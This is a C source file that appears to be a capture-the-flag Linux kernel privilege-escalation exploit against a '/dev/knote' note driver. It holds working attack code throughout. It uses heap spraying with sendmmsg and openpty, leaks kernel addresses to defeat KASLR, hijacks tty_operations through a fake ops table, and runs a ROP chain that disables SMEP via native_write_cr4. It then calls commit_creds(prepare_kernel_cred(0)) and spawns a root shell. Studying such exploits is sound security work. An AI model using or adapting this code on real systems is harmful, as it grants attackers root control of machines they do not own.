#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>

struct daytime_t
{
    long year, month, day, hour, minute, second;
};

struct add_note_arg_t
{
    struct daytime_t datetime;
    unsigned long content_size;
    const char *content_ptr_user;
};

struct read_note_arg_t
{
    unsigned long note_id;
    struct daytime_t datetime;
    unsigned long content_size;
    const char *content_ptr_user;
};

struct note_t
{
    struct daytime_t datetime;
    unsigned long epoch;
    unsigned long note_id;
    const char *content;
    unsigned long next;
    unsigned long prev;
};

void socket_sendmmsg(int sock, char *buffer, const unsigned long size)
{
    struct mmsghdr msg[1];

    // memset 0 (due to bug of musl-gcc)
    memset(msg, 0, sizeof(msg));

    msg[0].msg_hdr.msg_iovlen = 0;

    // Buffer to kmalloc.
    msg[0].msg_hdr.msg_control = &buffer[0];
    msg[0].msg_hdr.msg_controllen = size;

    // Make sendmmsg exit easy with EINVAL.
    msg[0].msg_hdr.msg_name = "root";
    msg[0].msg_hdr.msg_namelen = 1;
    //msg[0].msg_hdr.msg_flags = 0;

    int rv = syscall(__NR_sendmmsg, sock, msg, 1, 0);
    if (rv == -1 && errno != EINVAL)
    {
        perror("[-] sendmmsg()");
        exit(EXIT_FAILURE);
    }
}

void sendmmsg_kmalloc_kfree(int port, char *buffer, const unsigned long size)
{
    int sock[2];

    int rv = socketpair(AF_LOCAL, SOCK_DGRAM, 0, sock);
    if (rv != 0)
    {
        perror("socketpair()");
        exit(EXIT_FAILURE);
    }

    socket_sendmmsg(sock[0], buffer, size);

    close(sock[0]);
}

void set_affinity(int which_cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(which_cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        perror("sched_setaffinity()");
        exit(EXIT_FAILURE);
    }
}

int knote_fd;

void init_knote()
{
    knote_fd = open("/dev/knote", 0);
    if (knote_fd < 0)
    {
        perror("open");
        exit(1);
    }
}

unsigned long add_note(const struct daytime_t *datetime, const char *content, unsigned long content_size)
{
    // Needs to be synced.
    static unsigned long note_id = 0xDEADBEEF;

    struct add_note_arg_t arg;
    memcpy(&arg.datetime, datetime, sizeof(struct daytime_t));
    arg.content_size = content_size;
    arg.content_ptr_user = content;
    if (ioctl(knote_fd, 0x1337, &arg) < 0)
    {
        perror("add_note");
        return 0;
        // exit(1);
    }
    return note_id++;
}

void read_note(unsigned long note_id, const struct daytime_t *datetime, char *content, unsigned long content_size)
{
    struct read_note_arg_t arg;
    arg.note_id = note_id;
    memcpy(&arg.datetime, datetime, sizeof(struct daytime_t));
    arg.content_size = content_size;
    arg.content_ptr_user = content;
    if (ioctl(knote_fd, 0x1339, &arg) < 0)
    {
        perror("read_note");
        exit(1);
    }
}

int sendmmsg_port = 11111;

void limited_kernel_write(const void *ptr, unsigned long value)
{
    struct note_t prefill;
    prefill.prev = ptr;
    prefill.next = value;
    sendmmsg_kmalloc_kfree(sendmmsg_port++, &prefill, sizeof(struct note_t));

    char buf[8];
    struct daytime_t date = {0, 0, 0, 0, 0, 0};
    if (add_note(&date, buf, 'FAIL'))
    {
        fprintf(stderr, "Failed to perform kernel write.\n");
        exit(1);
    }
}

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = 0;
_prepare_kernel_cred prepare_kernel_cred = 0;

void get_root_payload(void)
{
    commit_creds(prepare_kernel_cred(0));
}

void get_shell()
{
    char *shell = "/bin/sh";
    char *args[] = {shell, NULL};
    execve(shell, args, NULL);
}

unsigned long pty_unix98_ops = 0;
unsigned long kernel_text_base = 0;
unsigned long next_freelist = 0;
unsigned long native_write_cr4 = 0;
unsigned long xchgeaxesp = 0;
unsigned long poprdiret = 0;
unsigned long iretq = 0;
unsigned long swapgs = 0;
const int MAX_PTY_SPRAY = 256;

void resolve_kernel_code_pointers()
{
    int tmp_fd_1[MAX_PTY_SPRAY], tmp_fd_2[MAX_PTY_SPRAY];
    for (int i = 0; i < MAX_PTY_SPRAY; i++)
    {
        if (openpty(&tmp_fd_1[i], &tmp_fd_2[i], NULL, NULL, NULL) == -1)
        {
            perror("openpty");
            exit(1);
        }
    }
    for (int i = 0; i < MAX_PTY_SPRAY; i++)
    {
        close(tmp_fd_1[i]);
        close(tmp_fd_2[i]);
    }

    char addrz[8];
    struct daytime_t date = {0, 0, 0, 0, 0, 0};
    unsigned long note_id = add_note(&date, addrz, 0);

    char readout[1024];
    read_note(note_id, &date, readout, 1024);
    fprintf(stderr, "Readout: ");
    for (int i = 0; i < 1024; i++)
    {
        fprintf(stderr, "%02x", (unsigned char)readout[i]);
    }
    fprintf(stderr, "\n");

    next_freelist = *(unsigned long *)readout;
    pty_unix98_ops = *(unsigned long *)(readout + 24);
    kernel_text_base = pty_unix98_ops - 0xa7b8e0;
    fprintf(stderr, "next_freelist = %p\npty_unix98_ops = %p\n", next_freelist, pty_unix98_ops);
    fprintf(stderr, "kernel_text_base = %p\n", kernel_text_base);
    if ((kernel_text_base & 0xFFFFF) != 0)
    {
        fprintf(stderr, "FAILED TO LEAK KERNEL ADDRESS.\n");
        exit(1);
    }
    native_write_cr4 = kernel_text_base + 0x64150;
    xchgeaxesp = kernel_text_base + 0x4752C4;
    commit_creds = kernel_text_base + 0xa5540;
    prepare_kernel_cred = kernel_text_base + 0xa5930;
    poprdiret = kernel_text_base + 0x6FD74D;
    iretq = kernel_text_base + 0x84b157;
    swapgs = kernel_text_base + 0x64234;
    fprintf(stderr, "native_write_cr4 = %p\n", native_write_cr4);
    fprintf(stderr, "commit_creds = %p\n", commit_creds);
    fprintf(stderr, "prepare_kernel_cred = %p\n", prepare_kernel_cred);
}

struct tty_driver
{
};
struct tty_struct
{
};
struct file
{
};
struct ktermios
{
};
struct termiox
{
};
struct serial_icounter_struct
{
};

struct tty_operations
{
    struct tty_struct *(*lookup)(struct tty_driver *, struct file *, int); /*     0     8 */
    int (*install)(struct tty_driver *, struct tty_struct *);              /*     8     8 */
    void (*remove)(struct tty_driver *, struct tty_struct *);              /*    16     8 */
    int (*open)(struct tty_struct *, struct file *);                       /*    24     8 */
    void (*close)(struct tty_struct *, struct file *);                     /*    32     8 */
    void (*shutdown)(struct tty_struct *);                                 /*    40     8 */
    void (*cleanup)(struct tty_struct *);                                  /*    48     8 */
    int (*write)(struct tty_struct *, const unsigned char *, int);         /*    56     8 */
    /* --- cacheline 1 boundary (64 bytes) --- */
    int (*put_char)(struct tty_struct *, unsigned char);                            /*    64     8 */
    void (*flush_chars)(struct tty_struct *);                                       /*    72     8 */
    int (*write_room)(struct tty_struct *);                                         /*    80     8 */
    int (*chars_in_buffer)(struct tty_struct *);                                    /*    88     8 */
    int (*ioctl)(struct tty_struct *, unsigned int, long unsigned int);             /*    96     8 */
    long int (*compat_ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*   104     8 */
    void (*set_termios)(struct tty_struct *, struct ktermios *);                    /*   112     8 */
    void (*throttle)(struct tty_struct *);                                          /*   120     8 */
    /* --- cacheline 2 boundary (128 bytes) --- */
    void (*unthrottle)(struct tty_struct *);           /*   128     8 */
    void (*stop)(struct tty_struct *);                 /*   136     8 */
    void (*start)(struct tty_struct *);                /*   144     8 */
    void (*hangup)(struct tty_struct *);               /*   152     8 */
    int (*break_ctl)(struct tty_struct *, int);        /*   160     8 */
    void (*flush_buffer)(struct tty_struct *);         /*   168     8 */
    void (*set_ldisc)(struct tty_struct *);            /*   176     8 */
    void (*wait_until_sent)(struct tty_struct *, int); /*   184     8 */
    /* --- cacheline 3 boundary (192 bytes) --- */
    void (*send_xchar)(struct tty_struct *, char);                           /*   192     8 */
    int (*tiocmget)(struct tty_struct *);                                    /*   200     8 */
    int (*tiocmset)(struct tty_struct *, unsigned int, unsigned int);        /*   208     8 */
    int (*resize)(struct tty_struct *, struct winsize *);                    /*   216     8 */
    int (*set_termiox)(struct tty_struct *, struct termiox *);               /*   224     8 */
    int (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); /*   232     8 */
    const struct file_operations *proc_fops;                                 /*   240     8 */

    /* size: 248, cachelines: 4, members: 31 */
    /* last cacheline: 56 bytes */
};

struct tty_operations fake_ops;

char fake_procfops[1024];

unsigned long user_cs, user_ss, user_rflags;

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

int main(void)
{
    save_state();

    set_affinity(0);

    init_knote();
    resolve_kernel_code_pointers();

    memset(&fake_ops, 0, sizeof(fake_ops));
    memset(fake_procfops, 0, sizeof(fake_procfops));
    fake_ops.proc_fops = &fake_procfops;
    fake_ops.ioctl = xchgeaxesp;

    int pty_masters[MAX_PTY_SPRAY], pty_slaves[MAX_PTY_SPRAY];
    for (int i = 0; i < MAX_PTY_SPRAY; i++)
    {
        if (openpty(&pty_masters[i], &pty_slaves[i], NULL, NULL, NULL) == -1)
        {
            perror("openpty");
            exit(1);
        }
    }

    for (int i = 0; i < 1; i++)
    {
        limited_kernel_write(next_freelist + i * 1024 + 24, &fake_ops);
    }

    unsigned long lower_addr = xchgeaxesp & 0xFFFFFFFF;
    unsigned long base = lower_addr & ~0xFFF;
    if (mmap(base, 0x10000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != base)
    {
        perror("mmap");
        exit(1);
    }
    unsigned long rop_chain[] = {
        poprdiret,
        0x6f0, // cr4 with smep disabled
        native_write_cr4,
        get_root_payload,
        swapgs,
        0, // dummy
        iretq,
        get_shell,
        user_cs, user_rflags, base + 0x10000, user_ss};
    memcpy(lower_addr, rop_chain, sizeof(rop_chain));

    for (int i = 0; i < MAX_PTY_SPRAY; i++)
    {
        ioctl(pty_masters[i], 0, 0);
    }

    return 0;
}
